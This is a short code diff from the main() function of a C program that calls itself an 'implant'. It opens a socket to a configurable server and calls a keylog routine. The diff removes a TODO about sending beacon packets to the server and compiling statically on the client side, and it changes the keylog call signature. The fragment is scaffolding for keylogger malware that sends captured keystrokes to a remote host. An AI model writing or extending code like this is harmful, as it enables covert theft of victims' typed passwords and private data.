@@ -5,15 +5,6 @@
 
 int main(int ac, char **av, char **envp) {
 
-    /*
-        TODO:
-
-        get current layout & send beacon packets to the server.
-        https://superuser.com/a/1300093
-
-        then, drop the lib dependancy and compile statically on client-side
-    */
-
     implant_t instance = {
         .ip = {0}, .port = 80, /* ip can be a domain name */
     };
@@ -33,6 +24,6 @@ int main(int ac, char **av, char **envp) {
     if (sockfd < 0)
         return 1;
 
-    keylog(&instance, sockfd);
+    keylog(&instance);
     return 0;
 }
